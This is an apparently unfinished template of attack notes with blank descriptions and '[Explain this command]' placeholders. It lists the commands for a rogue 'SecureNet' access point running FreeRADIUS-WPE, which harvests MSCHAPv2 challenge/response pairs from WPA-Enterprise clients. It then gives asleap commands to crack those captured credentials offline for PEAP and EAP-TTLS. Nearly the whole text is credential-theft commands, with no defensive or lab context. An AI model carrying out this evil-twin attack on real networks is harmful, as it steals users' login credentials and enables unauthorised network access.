## Setting up the AP with FreeRadius-WPE
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e SecureNet -c [channel] mon0  # [Explain this command]
/etc/init.d/freeradius-wpe start
tail -f /var/log/freeradius-wpe.log

```
## Cracking PEAP
*Description:*

# After capturing the MSCHAPv2 credentials using FreeRADIUS-WPE:
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]

```
## Cracking EAP-TTLS
*Description:*

# Extract the tunneled MSCHAPv2 challenge/response from FreeRADIUS-WPE logs
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]

Note: The cracking process is identical to PEAP once the inner authentication is revealed.
```